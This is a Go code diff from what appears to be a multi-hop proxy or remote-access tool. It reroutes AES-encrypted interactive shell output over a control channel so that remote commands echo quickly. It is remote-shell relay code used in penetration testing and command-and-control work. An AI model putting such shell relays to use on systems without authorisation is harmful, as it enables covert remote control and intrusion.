@@ -36,8 +36,6 @@ func CreatInteractiveShell() (io.Reader, io.Writer) {
 
 //启动shell
 func StartShell(command string, stdin io.Writer, stdout io.Reader, currentid uint32) {
-	dataType := "SHELLRESP"
-
 	buf := make([]byte, 1024)
 	stdin.Write([]byte(command))
 	for {
@@ -46,7 +44,8 @@ func StartShell(command string, stdin io.Writer, stdout io.Reader, currentid uin
 			//fmt.Println("error: ", err)
 			return
 		}
-		respShell, err := common.ConstructDataResult(0, 0, " ", dataType, string(buf[:count]), AESKey, currentid)
-		CmdResult <- respShell
+		respShell, err := common.ConstructCommand("SHELLRESP", string(buf[:count]), 0, AESKey) //放在控制信道回传，保证在数据信道拥挤时，命令依然可以快速执行与回显
+		//respShell, err := common.ConstructDataResult(0, 0, " ", dataType, string(buf[:count]), AESKey, currentid)
+		LowerNodeCommChan <- respShell
 	}
 }
